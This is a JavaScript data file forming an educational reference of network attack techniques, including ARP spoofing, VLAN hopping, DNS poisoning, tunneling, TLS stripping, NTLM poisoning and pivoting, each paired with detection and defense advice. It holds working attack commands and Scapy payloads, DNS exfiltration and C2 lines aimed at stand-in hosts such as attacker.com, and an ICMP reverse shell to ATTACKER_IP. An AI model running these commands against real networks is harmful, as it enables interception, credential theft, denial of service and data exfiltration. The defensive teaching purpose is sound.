// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
//
// Network Attack Techniques Reference Database
// Comprehensive reference for network-layer attack techniques, detection, and defense.

export const NETWORK_ATTACK_CATEGORIES = [
  {
    category: "Layer 2 Attacks",
    description: "Data link layer attacks targeting MAC addresses, VLANs, and switching infrastructure.",
    techniques: [
      {
        id: "NET-L2-001",
        name: "ARP Spoofing / ARP Poisoning",
        mitre: "T1557.002",
        description: "Sending falsified ARP messages to link the attacker's MAC address with the IP address of a legitimate host, redirecting traffic through the attacker's machine.",
        mechanism: "ARP is a stateless protocol — hosts accept ARP replies even without sending a request. By sending gratuitous ARP replies claiming to be the gateway, the attacker becomes a man-in-the-middle.",
        tools: [
          { name: "arpspoof", command: "arpspoof -i eth0 -t TARGET_IP GATEWAY_IP", description: "Part of dsniff suite — simplest ARP spoofing tool" },
          { name: "ettercap", command: "ettercap -T -M arp:remote /TARGET_IP// /GATEWAY_IP//", description: "Full-featured MITM framework with plugin support" },
          { name: "bettercap", command: "set arp.spoof.targets TARGET_IP; arp.spoof on", description: "Modern network attack framework with web UI" },
          { name: "Scapy", command: "sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=gateway_ip))", description: "Python packet crafting — full control over ARP packets" }
        ],
        impact: [
          "Man-in-the-middle interception of all traffic between target and gateway",
          "Credential sniffing on unencrypted protocols (HTTP, FTP, Telnet, POP3, IMAP)",
          "Session hijacking by stealing authentication cookies",
          "DNS spoofing by modifying DNS responses in transit",
          "Denial of service by dropping intercepted packets"
        ],
        detection: [
          "Static ARP entries for critical hosts (gateway, DNS)",
          "ARP watch tools: arpwatch, XArp — alert on MAC/IP mapping changes",
          "Network IDS rules for excessive ARP traffic or ARP anomalies",
          "Check for duplicate MAC addresses: arp -a | sort",
          "Monitor for gratuitous ARP packets from non-gateway hosts"
        ],
        defense: [
          "Dynamic ARP Inspection (DAI) on managed switches — validates ARP packets against DHCP snooping database",
          "DHCP Snooping — builds trusted IP-to-MAC mapping table",
          "802.1X port-based authentication — only authenticated devices on network",
          "Static ARP entries on critical servers: arp -s GATEWAY_IP GATEWAY_MAC",
          "VPN for sensitive traffic (HTTPS won't protect against DNS spoofing)",
          "Private VLANs to isolate hosts from each other"
        ],
        difficulty: "easy",
        prerequisites: "Same Layer 2 network segment as target",
        osLayer: "Layer 2 (Data Link)"
      },
      {
        id: "NET-L2-002",
        name: "MAC Flooding (CAM Table Overflow)",
        mitre: "T1557",
        description: "Flooding a switch with fake MAC addresses to overflow its Content Addressable Memory (CAM) table, causing it to fail open and broadcast all traffic like a hub.",
        mechanism: "Switches have a finite CAM table (typically 8K-128K entries). When full, the switch cannot learn new MAC addresses and forwards frames to all ports, allowing traffic sniffing.",
        tools: [
          { name: "macof", command: "macof -i eth0", description: "Part of dsniff — floods network with random MAC addresses (generates ~155K packets/min)" },
          { name: "yersinia", command: "yersinia -G (GUI) or yersinia -I (interactive)", description: "Multi-protocol attack framework supporting CAM overflow" },
          { name: "Scapy", command: "sendp(Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP()), loop=1)", description: "Custom MAC flooding with Scapy" }
        ],
        impact: [
          "Switch degrades to hub mode — all traffic visible to all ports",
          "Enables passive sniffing of all network traffic",
          "Network performance degradation due to broadcast flooding",
          "May crash older or underpowered switches"
        ],
        detection: [
          "Monitor switch CAM table utilization: show mac address-table count",
          "SNMP traps for MAC table threshold exceeded",
          "Port security violation logs",
          "Unusual number of MAC addresses on a single port"
        ],
        defense: [
          "Port Security: limit MAC addresses per port (switchport port-security maximum 2)",
          "Port Security violation mode: shutdown (disable port on violation)",
          "802.1X authentication — only authenticated devices on network",
          "MAC address change rate limiting",
          "Network segmentation with VLANs"
        ],
        difficulty: "easy",
        prerequisites: "Physical or virtual access to the target network switch"
      },
      {
        id: "NET-L2-003",
        name: "VLAN Hopping",
        mitre: "T1599.001",
        description: "Gaining access to traffic on VLANs that would normally be inaccessible, either through switch spoofing or double tagging.",
        mechanism: "Two primary methods: (1) Switch Spoofing — attacker negotiates a trunk link with the switch via DTP, gaining access to all VLANs. (2) Double Tagging — attacker sends frames with two 802.1Q tags; the switch strips the outer tag and forwards the inner-tagged frame to the target VLAN.",
        techniques: [
          {
            name: "Switch Spoofing (DTP)",
            description: "Negotiate a trunk port with the switch using Dynamic Trunking Protocol",
            command: "yersinia dtp -attack 1 -interface eth0",
            condition: "Switch port must be in 'dynamic auto' or 'dynamic desirable' mode (default on many Cisco switches)",
            defense: "Disable DTP: switchport nonegotiate. Set ports to access mode: switchport mode access"
          },
          {
            name: "Double Tagging",
            description: "Send frames with two VLAN tags — outer tag matches the native VLAN, inner tag is the target VLAN",
            command: "scapy: sendp(Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=TARGET_VLAN)/IP(dst=TARGET)/ICMP())",
            condition: "Attacker must be on the same VLAN as the trunk's native VLAN. One-way only (responses go to the real VLAN).",
            defense: "Change native VLAN to unused VLAN. Tag native VLAN: vlan dot1q tag native. Use dedicated trunk VLAN."
          }
        ],
        impact: [
          "Access to hosts on otherwise isolated VLANs",
          "Bypass network segmentation controls",
          "Reach sensitive network segments (servers, management VLANs)"
        ],
        defense: [
          "Disable DTP on all access ports: switchport nonegotiate",
          "Set all access ports to access mode: switchport mode access",
          "Change native VLAN from VLAN 1 to an unused VLAN",
          "Tag the native VLAN on trunk ports: vlan dot1q tag native",
          "Use private VLANs for additional isolation",
          "Prune unused VLANs from trunk ports"
        ],
        difficulty: "medium",
        prerequisites: "Physical network access; switch using default DTP configuration for switch spoofing"
      },
      {
        id: "NET-L2-004",
        name: "STP Manipulation",
        description: "Exploiting Spanning Tree Protocol to become the root bridge, allowing traffic interception or causing network outages.",
        mechanism: "STP elects a root bridge based on lowest bridge priority. An attacker can send BPDUs with a lower priority to become root bridge, causing all traffic to route through them.",
        tools: [
          { name: "yersinia", command: "yersinia stp -attack 4 (claim root bridge)", description: "Send BPDUs with lowest priority to become root" },
          { name: "Scapy", command: "sendp(Ether(dst='01:80:c2:00:00:00')/LLC()/STP(rootid=0,rootmac=attacker_mac,bridgeid=0,bridgemac=attacker_mac))", description: "Custom STP BPDU crafting" }
        ],
        impact: [
          "Man-in-the-middle — all traffic routes through attacker",
          "Denial of service — topology changes cause network instability",
          "Network reconnaissance — observe traffic patterns"
        ],
        defense: [
          "BPDU Guard on access ports: spanning-tree bpduguard enable",
          "Root Guard on trunk ports: spanning-tree guard root",
          "BPDU Filter on edge ports: spanning-tree bpdufilter enable",
          "Set root bridge explicitly with low priority",
          "Use RSTP/MSTP with authentication"
        ],
        difficulty: "medium"
      },
      {
        id: "NET-L2-005",
        name: "DHCP Starvation / Rogue DHCP",
        description: "Exhaust DHCP pool by requesting all available IPs with spoofed MAC addresses, then set up a rogue DHCP server to assign attacker-controlled settings.",
        mechanism: "Phase 1: Send DHCP Discover with random MAC addresses to exhaust the pool. Phase 2: Set up rogue DHCP server that assigns the attacker as default gateway and DNS server.",
        tools: [
          { name: "yersinia", command: "yersinia dhcp -attack 1 (starvation)", description: "Flood DHCP server with requests" },
          { name: "dhcpstarv", command: "dhcpstarv -i eth0", description: "DHCP starvation tool" },
          { name: "ettercap", command: "ettercap plugin: dhcp_spoof", description: "Rogue DHCP via ettercap plugin" },
          { name: "dnsmasq", command: "dnsmasq --interface=eth0 --dhcp-range=10.0.0.100,10.0.0.200,12h", description: "Lightweight DHCP/DNS server for rogue setup" }
        ],
        impact: [
          "Denial of service — new devices cannot obtain IP addresses",
          "Man-in-the-middle — rogue DHCP assigns attacker as gateway/DNS",
          "DNS hijacking via rogue DNS server assignment",
          "Full traffic interception without ARP spoofing"
        ],
        defense: [
          "DHCP Snooping: ip dhcp snooping (only trusted ports can send DHCP offers)",
          "Port Security to limit MAC addresses per port",
          "Rate limiting DHCP requests per port",
          "802.1X for network access control",
          "Static IP assignments for critical hosts"
        ],
        difficulty: "easy"
      }
    ]
  },
  {
    category: "DNS Attacks",
    description: "Attacks targeting the Domain Name System — the internet's phone book.",
    techniques: [
      {
        id: "NET-DNS-001",
        name: "DNS Cache Poisoning (Kaminsky Attack)",
        mitre: "T1557.003",
        description: "Inserting forged DNS responses into a recursive resolver's cache, redirecting legitimate domain lookups to attacker-controlled IP addresses.",
        mechanism: "The Kaminsky attack exploits the birthday paradox: the attacker floods the resolver with queries for random subdomains (e.g., xxx.example.com) while simultaneously sending spoofed responses. If a spoofed response matches the transaction ID before the real response arrives, the cache is poisoned for the entire domain.",
        tools: [
          { name: "dns-rebind", command: "Custom tooling required — no off-the-shelf tool for modern attacks", description: "Modern resolvers use source port randomization (65K ports × 65K TXIDs = ~4 billion combinations)" },
          { name: "Scapy", command: "send(IP(dst=resolver)/UDP(dport=53)/DNS(id=txid,qr=1,aa=1,an=DNSRR(rrname=domain,rdata=attacker_ip)))", description: "Craft DNS response packets" }
        ],
        impact: [
          "Redirect all traffic for a domain to attacker-controlled server",
          "Phishing — victims see legitimate URL but reach attacker's site",
          "Credential theft via fake login pages",
          "Malware distribution via fake software update servers",
          "Email interception by poisoning MX records"
        ],
        detection: [
          "Monitor for unexpected DNS response patterns",
          "DNSSEC validation failures",
          "Multiple DNS responses for a single query",
          "DNS response from unexpected source"
        ],
        defense: [
          "DNSSEC — cryptographic signing of DNS records",
          "Source port randomization (enabled by default in modern resolvers)",
          "Transaction ID randomization",
          "DNS-over-HTTPS (DoH) or DNS-over-TLS (DoT)",
          "Response Rate Limiting (RRL) on authoritative servers",
          "DNS response validation — check additional section"
        ],
        difficulty: "hard",
        prerequisites: "Network position to inject packets toward resolver; knowledge of resolver's query patterns"
      },
      {
        id: "NET-DNS-002",
        name: "DNS Tunneling",
        mitre: "T1572",
        description: "Encoding data within DNS queries and responses to establish a covert communication channel that bypasses firewalls and data loss prevention systems.",
        mechanism: "DNS queries (especially TXT, CNAME, MX, NULL records) can carry encoded data in the subdomain labels. A DNS tunnel client encodes data as subdomains (e.g., base32data.tunnel.attacker.com), and the attacker's authoritative DNS server decodes and responds with encoded data in the response.",
        tools: [
          { name: "iodine", command: "Server: iodined -f 10.0.0.1 tunnel.attacker.com\nClient: iodine -f tunnel.attacker.com", description: "Creates a network tunnel through DNS — supports IP-over-DNS with up to 1 Mbit/s throughput" },
          { name: "dnscat2", command: "Server: ruby dnscat2.rb tunnel.attacker.com\nClient: ./dnscat --dns=server=attacker_dns,domain=tunnel.attacker.com", description: "Encrypted C2 channel over DNS with shell, file transfer, and port forwarding" },
          { name: "dns2tcp", command: "Server: dns2tcpd -f dns2tcpd.conf\nClient: dns2tcpc -r ssh -z tunnel.attacker.com", description: "TCP-over-DNS tunnel" },
          { name: "DNSExfiltrator", command: "python dnsexfiltrator.py -d attacker.com -f secret.txt", description: "Data exfiltration over DNS TXT queries" }
        ],
        impact: [
          "Data exfiltration bypassing DLP and egress filtering",
          "Command and control communication that evades firewall rules",
          "Tunnel any protocol (SSH, HTTP, VPN) through DNS",
          "Bypass captive portals and access control"
        ],
        detection: [
          "Anomalous DNS query volume from single host",
          "Unusually long subdomain labels (>30 characters per label)",
          "High ratio of TXT/NULL/CNAME queries",
          "DNS queries to newly registered or suspicious domains",
          "Entropy analysis of DNS query names (encoded data has high entropy)",
          "DNS query/response size ratio anomalies",
          "Periodic DNS patterns (beaconing behavior)"
        ],
        defense: [
          "DNS query logging and analysis (Passive DNS)",
          "DNS firewall / DNS-layer security (Cisco Umbrella, Quad9)",
          "Block direct DNS to external resolvers — force all DNS through internal resolvers",
          "Monitor for DNS requests with high entropy subdomain names",
          "Limit DNS TXT record response sizes",
          "Deep packet inspection for DNS tunneling signatures"
        ],
        difficulty: "medium"
      },
      {
        id: "NET-DNS-003",
        name: "DNS Rebinding",
        description: "Exploiting the browser's same-origin policy by making a domain resolve to the attacker's server initially, then to an internal IP address, allowing the browser to make requests to internal services.",
        mechanism: "Step 1: Victim visits attacker.com which resolves to attacker's IP (serves malicious JavaScript). Step 2: DNS record for attacker.com is changed to resolve to an internal IP (e.g., 192.168.1.1). Step 3: Browser's same-origin policy allows JavaScript on attacker.com to make requests to the internal IP (since the domain is the same).",
        tools: [
          { name: "singularity", command: "go run cmd/singularity-server/main.go", description: "DNS rebinding attack framework with automated payload delivery" },
          { name: "rbndr", command: "Configure DNS records with short TTL alternating between attacker and target IPs", description: "DNS rebinding service" },
          { name: "whonow", command: "whonow.py --domain rebind.attacker.com --rebind-to 192.168.1.1", description: "Dynamic DNS rebinding server" }
        ],
        impact: [
          "Access internal services (routers, IoT devices, admin panels) from victim's browser",
          "Bypass firewall rules — requests come from inside the network",
          "Read responses from internal HTTP services",
          "Port scan internal network via victim's browser",
          "Exploit vulnerable internal services"
        ],
        detection: [
          "Monitor for DNS records with very short TTL (<60 seconds)",
          "DNS responses resolving to private IP ranges for public domains",
          "Browser-level DNS rebinding protection (most modern browsers cache DNS)"
        ],
        defense: [
          "DNS rebinding protection in resolver — reject private IPs for public domains",
          "Host header validation on internal services",
          "Authentication on all internal services (not just network-level access)",
          "Browser DNS caching (reduces effectiveness but doesn't eliminate)",
          "Disable unnecessary internal services"
        ],
        difficulty: "medium"
      },
      {
        id: "NET-DNS-004",
        name: "DNS Zone Transfer (AXFR)",
        mitre: "T1590.002",
        description: "Requesting a full copy of a DNS zone's records from a misconfigured authoritative DNS server, revealing all hostnames and IP addresses in the domain.",
        tools: [
          { name: "dig", command: "dig @ns1.target.com target.com AXFR", description: "Standard DNS tool — request zone transfer" },
          { name: "host", command: "host -t axfr target.com ns1.target.com", description: "Simpler zone transfer request" },
          { name: "nslookup", command: "nslookup -type=axfr target.com ns1.target.com", description: "Windows-friendly zone transfer" },
          { name: "dnsrecon", command: "dnsrecon -d target.com -t axfr", description: "DNS enumeration including zone transfer attempts" }
        ],
        impact: [
          "Complete DNS record enumeration — all subdomains, hosts, MX, NS records",
          "Internal hostname discovery (intranet, vpn, dev, staging servers)",
          "Network topology mapping",
          "Identify targets for further reconnaissance"
        ],
        defense: [
          "Restrict zone transfers to secondary DNS servers only: allow-transfer { secondary_dns_ip; };",
          "Use TSIG (Transaction Signature) authentication for zone transfers",
          "Monitor for unauthorized AXFR attempts",
          "Split DNS (different views for internal/external)"
        ],
        difficulty: "easy"
      },
      {
        id: "NET-DNS-005",
        name: "DNS Amplification Attack (DDoS)",
        mitre: "T1498.002",
        description: "Sending small DNS queries with a spoofed source IP (victim's IP) to open DNS resolvers that respond with much larger responses, amplifying the traffic against the victim.",
        mechanism: "Amplification factor: a 64-byte DNS query can generate a 3,000+ byte response (especially ANY queries or DNSSEC-signed responses) — up to 70x amplification. With millions of open resolvers, this creates massive DDoS floods.",
        tools: [
          { name: "hping3", command: "hping3 --udp -p 53 --spoof VICTIM_IP OPEN_RESOLVER (educational/authorized testing only)", description: "Packet crafting for testing DNS amplification" },
          { name: "Scapy", command: "send(IP(src=victim_ip,dst=resolver)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname='.',qtype='ANY')))", description: "Craft spoofed DNS queries (authorized testing only)" }
        ],
        impact: [
          "Volumetric DDoS against victim — potentially hundreds of Gbps",
          "Victim's network saturated with DNS responses they didn't request",
          "Difficult to filter — responses are legitimate DNS traffic"
        ],
        defense: [
          "Response Rate Limiting (RRL) on DNS servers",
          "Disable open recursion on DNS servers: allow-recursion { trusted_networks; };",
          "BCP38/BCP84 — network ingress filtering to prevent IP spoofing",
          "Anycast DNS distribution",
          "DDoS mitigation services (Cloudflare, Akamai, AWS Shield)"
        ],
        difficulty: "easy",
        prerequisites: "List of open DNS resolvers; ability to spoof source IP (requires network that doesn't implement BCP38)"
      }
    ]
  },
  {
    category: "Man-in-the-Middle (MITM) Attacks",
    description: "Intercepting and potentially modifying communication between two parties who believe they are communicating directly.",
    techniques: [
      {
        id: "NET-MITM-001",
        name: "SSL/TLS Stripping",
        mitre: "T1557",
        description: "Downgrading HTTPS connections to HTTP by intercepting the initial HTTP request (before HTTPS redirect) and proxying between the victim (HTTP) and the server (HTTPS).",
        mechanism: "The attacker positions themselves as MITM (via ARP spoofing, rogue AP, etc.). When the victim requests http://bank.com, the attacker intercepts and establishes HTTPS with the real server, while keeping the connection to the victim as plain HTTP. The victim sees HTTP in the address bar but may not notice.",
        tools: [
          { name: "sslstrip", command: "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000; sslstrip -l 10000", description: "Original SSL stripping tool by Moxie Marlinspike" },
          { name: "bettercap", command: "set http.proxy.sslstrip true; http.proxy on; arp.spoof on", description: "Modern MITM framework with SSL stripping" },
          { name: "mitmproxy", command: "mitmproxy --mode transparent --ssl-insecure", description: "Interactive MITM proxy with SSL interception" }
        ],
        impact: [
          "Credential theft — login forms sent over HTTP",
          "Session hijacking — cookies transmitted in cleartext",
          "Content modification — inject JavaScript, modify responses",
          "Complete traffic visibility"
        ],
        defense: [
          "HSTS (HTTP Strict Transport Security) — browser refuses HTTP after first HTTPS visit",
          "HSTS Preload — browser refuses HTTP even on first visit (domain in browser preload list)",
          "HTTPS-only mode in browsers",
          "Certificate Transparency monitoring",
          "HSTS max-age: 31536000 with includeSubDomains"
        ],
        difficulty: "easy",
        prerequisites: "Man-in-the-middle position (ARP spoof, rogue AP, DNS spoof)"
      },
      {
        id: "NET-MITM-002",
        name: "Rogue Access Point / Evil Twin",
        mitre: "T1557.002",
        description: "Setting up a fake WiFi access point with the same SSID as a legitimate network to capture traffic from connecting devices.",
        mechanism: "The attacker creates an AP with the same SSID (and optionally BSSID) as a trusted network. Devices may auto-connect if they've connected to that SSID before. The attacker can then intercept all traffic, perform SSL stripping, DNS spoofing, or credential capture.",
        tools: [
          { name: "hostapd", command: "hostapd evil_twin.conf (with SSID matching target)", description: "Linux access point daemon — creates the rogue AP" },
          { name: "dnsmasq", command: "dnsmasq --interface=wlan0 --dhcp-range=10.0.0.10,10.0.0.200 --no-daemon", description: "DHCP and DNS for the rogue network" },
          { name: "wifiphisher", command: "wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade", description: "Automated WiFi phishing tool with social engineering templates" },
          { name: "fluxion", command: "fluxion (interactive menu)", description: "Automated evil twin with WPA handshake capture and social engineering" },
          { name: "bettercap", command: "wifi.ap on; wifi.deauth TARGET_BSSID", description: "Create rogue AP while deauthing clients from legitimate AP" }
        ],
        impact: [
          "Complete traffic interception for all connected clients",
          "Credential capture via captive portal phishing",
          "DNS hijacking — redirect any domain to attacker's server",
          "MITM attacks on all client connections",
          "WPA/WPA2 handshake capture for offline cracking"
        ],
        defense: [
          "802.1X / WPA Enterprise — mutual authentication prevents rogue AP attacks",
          "Wireless IDS (wIDS) — detect rogue access points",
          "VPN for all wireless traffic",
          "Certificate pinning in mobile apps",
          "HTTPS everywhere with HSTS preload",
          "User education — verify WiFi network authenticity"
        ],
        difficulty: "easy"
      },
      {
        id: "NET-MITM-003",
        name: "LLMNR/NBT-NS Poisoning",
        mitre: "T1557.001",
        description: "Responding to LLMNR (Link-Local Multicast Name Resolution) and NetBIOS Name Service broadcast queries to capture NTLMv2 hashes on Windows networks.",
        mechanism: "When a Windows host fails to resolve a hostname via DNS, it falls back to LLMNR (multicast) and NBT-NS (broadcast). An attacker on the same network responds to these queries, claiming to be the requested host. The victim then sends authentication credentials (NTLM hash) to the attacker.",
        tools: [
          { name: "Responder", command: "responder -I eth0 -wrf", description: "LLMNR/NBT-NS/mDNS poisoner with built-in rogue servers (SMB, HTTP, SQL, FTP, LDAP)" },
          { name: "Inveigh", command: "Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -mDNS Y", description: "PowerShell-based LLMNR/NBT-NS poisoner (for Windows hosts)" },
          { name: "MultiRelay", command: "python MultiRelay.py -t TARGET_IP -u ALL", description: "Relay captured NTLM hashes to other hosts" }
        ],
        impact: [
          "Capture NTLMv2 hashes for offline cracking (hashcat mode 5600)",
          "Relay NTLM authentication to other services (SMB, LDAP, HTTP)",
          "Gain access to file shares, admin panels, and other authenticated resources",
          "Potential domain compromise via relay to Domain Controller"
        ],
        defense: [
          "Disable LLMNR: Group Policy → Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution",
          "Disable NBT-NS: Network adapter properties → IPv4 → Advanced → WINS → Disable NetBIOS over TCP/IP",
          "Enable SMB Signing: Group Policy → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Microsoft network server: Digitally sign communications (always)",
          "Network segmentation — isolate workstations",
          "Use DNS for all name resolution",
          "Deploy EDR that detects Responder-like behavior"
        ],
        difficulty: "easy",
        prerequisites: "Same network segment as Windows hosts"
      }
    ]
  },
  {
    category: "TLS/SSL Attacks",
    description: "Attacks targeting the Transport Layer Security protocol and its implementations.",
    techniques: [
      {
        id: "NET-TLS-001",
        name: "POODLE (Padding Oracle On Downgraded Legacy Encryption)",
        cve: "CVE-2014-3566",
        description: "Attack against SSL 3.0's CBC mode cipher suites. Exploits the way SSL 3.0 handles CBC padding to decrypt encrypted data one byte at a time.",
        mechanism: "SSL 3.0 does not specify the content of padding bytes (only the last byte must equal the padding length). An attacker can manipulate the ciphertext and observe whether the server accepts or rejects the padding, using this oracle to decrypt each byte.",
        impact: "Decrypt HTTPS traffic one byte at a time (256 requests per byte on average). Primarily targets session cookies.",
        defense: [
          "Disable SSL 3.0 completely: ssl_protocols TLSv1.2 TLSv1.3; (nginx)",
          "TLS_FALLBACK_SCSV — prevents protocol downgrade attacks",
          "Use only AEAD cipher suites (GCM, ChaCha20-Poly1305)"
        ],
        status: "Mostly mitigated — SSL 3.0 disabled in all modern clients and servers"
      },
      {
        id: "NET-TLS-002",
        name: "BEAST (Browser Exploit Against SSL/TLS)",
        cve: "CVE-2011-3389",
        description: "Attack against TLS 1.0's CBC mode that exploits the predictable IV (initialization vector) to perform a chosen-plaintext attack.",
        mechanism: "TLS 1.0 uses the last ciphertext block as the IV for the next record. This allows an attacker who can inject known plaintext (via JavaScript) to determine one byte of unknown plaintext per request.",
        impact: "Decrypt session cookies in TLS 1.0 CBC cipher suites.",
        defense: [
          "Use TLS 1.2+ (TLS 1.1+ uses random IVs)",
          "Prefer AEAD cipher suites over CBC",
          "1/n-1 record splitting (implemented in all modern clients as mitigation)"
        ],
        status: "Mitigated — TLS 1.0 deprecated; client-side 1/n-1 splitting prevents exploitation"
      },
      {
        id: "NET-TLS-003",
        name: "Heartbleed",
        cve: "CVE-2014-0160",
        description: "Buffer over-read vulnerability in OpenSSL's TLS Heartbeat extension that leaks up to 64KB of server memory per request, including private keys, session tokens, and user data.",
        mechanism: "The TLS Heartbeat protocol lets one endpoint send a payload and expect it echoed back. OpenSSL failed to validate the stated payload length against the actual payload size, causing it to read and return adjacent memory.",
        tools: [
          { name: "nmap", command: "nmap -p 443 --script ssl-heartbleed TARGET", description: "Detect Heartbleed vulnerability" },
          { name: "sslscan", command: "sslscan --show-certificate TARGET:443", description: "SSL/TLS scanner that checks for Heartbleed" },
          { name: "testssl.sh", command: "testssl.sh --heartbleed TARGET:443", description: "Comprehensive TLS testing including Heartbleed" }
        ],
        impact: [
          "Private key extraction — complete TLS compromise",
          "Session token theft — impersonate any user",
          "Password and credential exposure from server memory",
          "Customer data leakage"
        ],
        defense: [
          "Update OpenSSL to 1.0.1g+ or apply vendor patches",
          "Regenerate SSL certificates after patching (private key may have been exposed)",
          "Revoke old certificates",
          "Reset all user sessions and passwords if exploitation suspected"
        ],
        status: "Patched since April 2014 — but some systems remain unpatched"
      },
      {
        id: "NET-TLS-004",
        name: "CRIME / BREACH",
        cve: "CVE-2012-4929 (CRIME) / CVE-2013-3587 (BREACH)",
        description: "Compression side-channel attacks that exploit TLS compression (CRIME) or HTTP compression (BREACH) to extract secrets from encrypted responses.",
        mechanism: "When a response contains both attacker-controlled and secret data, and HTTP compression is enabled, the attacker can guess secret bytes and observe the response size. Correct guesses compress better (smaller response), leaking the secret one byte at a time.",
        impact: "Extract CSRF tokens, session cookies, and other secrets from compressed HTTPS responses.",
        defense: [
          "CRIME: Disable TLS-level compression (all modern clients/servers do this by default)",
          "BREACH: Disable HTTP compression on responses containing secrets, randomize CSRF tokens, use SameSite cookies, separate secret-bearing responses from user-controlled content",
          "Add random padding to responses containing secrets"
        ],
        status: "CRIME mitigated (TLS compression disabled). BREACH still relevant — HTTP compression is common."
      },
      {
        id: "NET-TLS-005",
        name: "DROWN (Decrypting RSA with Obsolete and Weakened eNcryption)",
        cve: "CVE-2016-0800",
        description: "Cross-protocol attack: if a server (or any server sharing the same RSA key) supports SSLv2, TLS connections to that server can be decrypted.",
        mechanism: "The attacker captures TLS sessions encrypted with RSA key exchange. If any server using the same RSA certificate supports SSLv2, the attacker can use SSLv2's weak export ciphers to recover the RSA session key and decrypt the captured TLS sessions.",
        impact: "Decrypt captured TLS sessions. Affects approximately 33% of HTTPS servers when discovered.",
        defense: [
          "Disable SSLv2 on all servers using the same certificate",
          "Use unique certificates per server",
          "Update OpenSSL (patches removed SSLv2 support)",
          "Prefer ECDHE key exchange (provides forward secrecy)"
        ],
        status: "Mitigated — SSLv2 removed from modern TLS libraries"
      },
      {
        id: "NET-TLS-006",
        name: "ROBOT (Return Of Bleichenbacher's Oracle Threat)",
        cve: "CVE-2017-13099",
        description: "Revival of the 1998 Bleichenbacher attack against RSA PKCS#1 v1.5 padding in TLS. Many TLS implementations still leaked whether padding was valid, enabling decryption of RSA key exchanges.",
        mechanism: "The attacker sends crafted TLS ClientKeyExchange messages with modified RSA ciphertext. Differences in server behavior (timing, error messages, alert types) reveal whether the PKCS#1 v1.5 padding is valid, creating an oracle for RSA decryption.",
        impact: "Decrypt TLS traffic using RSA key exchange. Sign arbitrary messages with the server's private key.",
        defense: [
          "Prefer ECDHE key exchange (eliminates RSA key transport entirely)",
          "Update TLS library to version that properly implements constant-time RSA decryption",
          "Disable RSA key exchange cipher suites: ssl_ciphers 'ECDHE+AESGCM:ECDHE+CHACHA20';"
        ],
        status: "Patched in most implementations. Prefer ECDHE to avoid RSA key exchange entirely."
      }
    ]
  },
  {
    category: "Network Pivoting & Tunneling",
    description: "Techniques for extending access from a compromised host to reach otherwise inaccessible network segments.",
    techniques: [
      {
        id: "NET-PIV-001",
        name: "SSH Tunneling",
        mitre: "T1572",
        description: "Using SSH to create encrypted tunnels for port forwarding, dynamic SOCKS proxying, or reverse tunneling to access internal networks.",
        types: [
          {
            name: "Local Port Forwarding (-L)",
            command: "ssh -L 8080:internal-server:80 user@pivot-host",
            description: "Forward local port 8080 to internal-server:80 through the SSH connection. Access http://localhost:8080 to reach the internal server.",
            useCase: "Access internal web services, databases, or admin panels from your machine"
          },
          {
            name: "Remote Port Forwarding (-R)",
            command: "ssh -R 4444:localhost:22 user@attacker-server",
            description: "Forward attacker-server:4444 to the compromised host's SSH port. Connect to attacker-server:4444 to reach the compromised host.",
            useCase: "Create a reverse shell/tunnel back to your server when direct inbound is blocked"
          },
          {
            name: "Dynamic SOCKS Proxy (-D)",
            command: "ssh -D 1080 user@pivot-host",
            description: "Creates a SOCKS4/5 proxy on localhost:1080. Configure browser/tools to use this proxy to route all traffic through the pivot host.",
            useCase: "Browse the internal network through the compromised host's perspective"
          },
          {
            name: "SSH over SSH (ProxyJump)",
            command: "ssh -J user@pivot1 user@pivot2 user@target",
            description: "Chain SSH connections through multiple pivot hosts to reach deeply nested targets.",
            useCase: "Reach hosts that are only accessible from specific jump hosts"
          }
        ],
        defense: [
          "Monitor SSH sessions for unusual forwarding",
          "Restrict SSH port forwarding: AllowTcpForwarding no in sshd_config",
          "Network segmentation with strict ACLs",
          "Monitor outbound SSH connections from servers"
        ]
      },
      {
        id: "NET-PIV-002",
        name: "Chisel (HTTP Tunneling)",
        description: "Fast TCP/UDP tunnel over HTTP, useful when SSH is blocked but HTTP(S) is allowed.",
        commands: [
          { name: "Server", command: "chisel server -p 8080 --reverse", description: "Start Chisel server on attacker machine" },
          { name: "Client (forward)", command: "chisel client attacker:8080 3306:internal-db:3306", description: "Forward internal database through Chisel tunnel" },
          { name: "Client (reverse SOCKS)", command: "chisel client attacker:8080 R:socks", description: "Create reverse SOCKS proxy through Chisel" }
        ],
        advantages: [
          "Works over HTTP/HTTPS — bypasses SSH-blocking firewalls",
          "Single binary — no dependencies",
          "Supports SOCKS5 proxy",
          "Encrypted communication",
          "Cross-platform (Windows, Linux, macOS)"
        ]
      },
      {
        id: "NET-PIV-003",
        name: "Proxychains / SOCKS Pivoting",
        description: "Route any TCP tool through a chain of SOCKS/HTTP proxies to access internal networks.",
        commands: [
          { name: "Setup", command: "echo 'socks5 127.0.0.1 1080' >> /etc/proxychains.conf", description: "Configure proxy chain" },
          { name: "Usage", command: "proxychains nmap -sT -Pn -p 22,80,443 192.168.1.0/24", description: "Scan internal network through proxy" },
          { name: "Multi-hop", command: "socks5 127.0.0.1 1080\nsocks5 127.0.0.1 1081", description: "Chain multiple proxies for multi-hop pivoting" }
        ]
      },
      {
        id: "NET-PIV-004",
        name: "ICMP Tunneling",
        description: "Encapsulating TCP/IP traffic within ICMP Echo Request/Reply packets to bypass firewalls that allow ping but block other traffic.",
        tools: [
          { name: "ptunnel-ng", command: "Server: ptunnel-ng -r TARGET_IP\nClient: ptunnel-ng -p PROXY_IP -l 8000 -r TARGET_IP -R 22", description: "TCP-over-ICMP tunnel" },
          { name: "icmpsh", command: "Server: python icmpsh_m.py ATTACKER_IP VICTIM_IP\nClient: icmpsh.exe -t ATTACKER_IP", description: "Simple ICMP reverse shell (Windows)" },
          { name: "hans", command: "Server: hans -s 10.0.0.1 -p password\nClient: hans -c SERVER_IP -p password", description: "IP-over-ICMP tunnel — creates tun interface" }
        ],
        detection: [
